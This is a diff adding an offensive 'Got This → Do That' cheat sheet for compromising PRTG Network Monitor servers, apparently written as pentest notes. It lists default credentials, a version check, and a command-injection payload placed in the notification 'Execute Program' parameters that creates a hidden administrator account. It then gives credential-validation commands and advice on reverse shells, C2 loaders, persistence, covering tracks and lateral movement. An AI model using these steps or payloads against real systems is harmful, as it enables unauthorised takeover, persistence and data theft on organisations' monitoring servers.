@@ -1,0 +1,69 @@
+🧠 “Got This → Do That” – PRTG Edition
+✅ Got This: Port 8080 (or 80/443) shows Paessler / Indy httpd / PRTG
+Do This:
+
+Try creds:
+
+prtgadmin:prtgadmin
+
+prtgadmin:Password123
+
+Or test weak creds via Hydra / Burp / Intruder if needed
+
+Confirm version in HTML:
+
+perl
+Copy
+Edit
+curl -s http://<IP>:8080/index.htm | grep version
+✅ Got This: Version < 18.2.39 (e.g., 17.3.33) + Logged In
+Do This:
+
+Head to:
+Setup → Account Settings → Notifications
+
+Click Add new notification
+
+✅ Got This: Access to “Execute Program” field
+Do This:
+
+Under Program File, select:
+Demo exe notification - outfile.ps1
+
+In Parameters, input your payload:
+
+Add user + elevate to admin (blind RCE):
+
+sql
+Copy
+Edit
+test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
+Or, spawn rev shell (PowerShell-style one-liner or Invoke-WebRequest)
+
+✅ Got This: Payload submitted
+Do This:
+
+Click Test → confirm “queued” popup
+
+No feedback (blind exec), so validate with:
+
+bash
+Copy
+Edit
+crackmapexec smb <ip> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
+Or:
+
+RDP / evil-winrm / wmiexec / psexec
+
+🧠 Bonus Moves:
+Set scheduled notification for persistence
+
+Create a “beaconing” script for callback every X mins
+
+Replace command with C2 loader or dropper
+
+Cleanup user from net user prtgadm1 /delete after loot
+
+🪓 Quick Real-World Tip:
+Most orgs treat PRTG as “just a monitor,” not a threat. But if it's running as SYSTEM and you pop it with one notification, you now own every metric, SNMP trap, or alert coming through it—great for lateral movement or passive data theft.
+
